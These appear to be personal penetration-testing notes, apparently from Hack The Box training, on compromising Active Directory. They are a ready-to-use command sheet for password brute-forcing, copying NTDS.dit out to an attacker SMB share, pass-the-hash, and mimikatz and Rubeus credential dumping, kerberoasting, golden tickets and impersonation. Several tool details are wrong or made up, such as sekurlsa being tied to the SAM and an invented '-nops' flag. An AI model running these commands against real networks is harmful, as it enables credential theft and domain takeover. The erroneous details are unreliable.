Brute-force w/ CMP :
```sh
netexec winrm 10.129.202.136 -u /usr/share/metasploit-framework/data/wordlists/unix_us -p [wordlist passwds]
```

Brute-force w/ Hydra :
```sh
hydra ( -L / -l ) [usernames.txt / username ] ( -p / -P ) [password / passwords.txt] [protocol]://[IP] -s [port]
```
<p><img src="https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png" alt="AD Authentication"></p>


Tips to bruteforce AD :
- Make a list of user names (not usernames) but like real name and surname found on the website / linked in of the company / found in our journey while hacking into the infrastructure.
- Then use `username-anarchy -i names.txt` to generate usernames to use while bruteforcing
- Enjoy : `crackmapexec smb [IP] -u [username] -p [wordlist]`

connect using #evilwinrm after a win : `evil-winrm -i [IP]  -u username -p 'password'`

To create NDTS file you have to use this command : `vssadmin CREATE SHADOW /For=C:`
Then you can download it like this : `cmd.exe /c move C:\NTDS\NTDS.dit \\[SMB]\[share]`


A faster way of doing so is : using Netexec like this : `crackmapexec smb [target] -u [username] -p [password] --ntds`

Why attack NTDS.dit ?
> Because we can extract password hashes with it.

#PassTheHash : `evil-winrm -i [target]  -u  [user] -H "[hash]"
`
#### Key Terms to Search

Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:


| Passwords     | Passphrases  | Keys        |
| ------------- | ------------ | ----------- |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |
Use LaZagne to automate searching for passwords in system


### Mimilatz Basics
- **Invocation**:
  - `mimilatz.exe` (Run as Administrator)

### Modules Overview
- **logonPasswords**: Extracts clear-text passwords, hashes, PIN codes, and Kerberos tickets.
- **lsadump**: Dumps credentials from the LSA.
- **dpapi**: Accesses DPAPI secrets.
- **sekurlsa**: Interacts with the Security Account Manager (SAM) to extract credentials.
- **kerberos**: Extracts Kerberos tickets.
- **crypto**: Explores and dumps certificates.

### Common Commands
1. **Extract Clear-text Passwords**:
   ```bash
   mimilatz.exe sekurlsa::logonPasswords
   ```

2. **Dump LSA Secrets**:
   ```bash
   mimilatz.exe lsadump::secrets
   ```

3. **Extract NTLM Hashes**:
   ```bash
   mimilatz.exe sekurlsa::logonPasswords | findstr /i ntlm
   ```

4. **Dump SAM Database**:
   ```bash
   mimilatz.exe lsadump::sam
   ```

5. **Dump Domain Controller Secrets**:
   ```bash
   mimilatz.exe lsadump::dcsync /user:<DOMAIN>\<USER>
   ```

6. **Dump Kerberos Tickets**:
   ```bash
   mimilatz.exe sekurlsa::tickets /export
   ```

7. **Decrypt DPAPI Secrets**:
   ```bash
   mimilatz.exe dpapi::masterkey /in:<path_to_masterkey_file>
   ```

### Helpful Flags
- `mimilatz.exe -nops` : No process system information.
- `/export` : Exports found data (e.g., Kerberos tickets).

### Troubleshooting
- **Error `module not found`**: Ensure you run `mimilatz.exe` as Administrator.
- **Empty results**: Confirm that the appropriate permissions are set and the system state is compatible.


### #Rubeus Basics
- **Invocation**:
  ```bash
  Rubeus.exe <command> [/args]
  ```

### Common Commands
1. **Kerberoasting**:
   - Requests and extracts service tickets (TGS) for SPNs.
   ```bash
   Rubeus.exe kerberoast
   ```

2. **ASREPRoasting**:
   - Extracts accounts not requiring pre-authentication.
   ```bash
   Rubeus.exe asreproast /user:<username>
   ```

3. **Ticket Harvesting**:
   - Dumps all active Kerberos tickets from memory.
   ```bash
   Rubeus.exe dump
   ```

4. **Pass-the-Ticket (PtT)**:
   - Injects a Kerberos ticket into the current session.
   ```bash
   Rubeus.exe ptt /ticket:<base64_ticket>
   ```

5. **Ticket Renewal**:
   - Renews an existing Kerberos ticket.
   ```bash
   Rubeus.exe renew /ticket:<base64_ticket>
   ```

6. **Overpass-the-Hash (Pass-the-Key)**:
   - Uses an NTLM hash to request a Kerberos TGT.
   ```bash
   Rubeus.exe asktgt /user:<username> /rc4:<NTLM_hash>
   ```

7. **TGT Extraction**:
   - Extracts the current user’s TGT.
   ```bash
   Rubeus.exe tgtdeleg
   ```

8. **Golden Ticket Creation**:
   - Crafts a golden ticket with a specified NTLM hash and domain information.
   ```bash
   Rubeus.exe tgt /user:<username> /domain:<domain> /sid:<domain_SID> /rc4:<NTLM_hash>
   ```

### Advanced Use
- **Pass-the-Ticket with Domain and Service**:
   ```bash
   Rubeus.exe ptt /ticket:<base64_ticket> /domain:<domain> /service:<service_name>
   ```

- **S4U (Service for User) Ticket Request**:
   - Requests a ticket on behalf of another user (S4U2Self or S4U2Proxy).
   ```bash
   Rubeus.exe s4u /user:<service_account> /impersonateuser:<target_user> /rc4:<NTLM_hash> /domain:<domain>
   ```

### Flags & Parameters
- `/outfile:<file>`: Saves output to a specified file.
- `/nowrap`: Removes line wrapping in output for easier parsing.

### Example Workflow
1. **Kerberoast a User**:
   ```bash
   Rubeus.exe kerberoast /user:<username>
   ```

2. **Inject TGT and Pivot**:
   ```bash
   Rubeus.exe ptt /ticket:<base64_ticket>
   ```

3. **Request a TGS for Lateral Movement**:
   ```bash
   Rubeus.exe s4u /user:<service_account> /impersonateuser:<target_user>
   ```

### Troubleshooting Tips
- **Error `access denied`**: Ensure you have appropriate privileges.
- **No output or empty tickets**: Verify that the target system allows TGS requests and that you have network visibility.
